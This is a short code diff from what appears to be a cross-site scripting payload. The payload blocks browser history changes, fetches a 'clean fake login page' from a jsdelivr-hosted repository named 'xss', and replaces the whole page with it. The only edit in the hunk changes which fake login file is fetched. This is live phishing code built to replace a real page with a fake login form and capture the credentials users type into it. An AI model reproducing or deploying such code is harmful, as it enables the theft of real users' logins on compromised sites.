@@ -16,7 +16,7 @@
     history.pushState = () => {};
 
     // Load the clean fake login page
-    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
+    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login1.html')
         .then(response => response.text())
         .then(html => {
             // Full page replacement
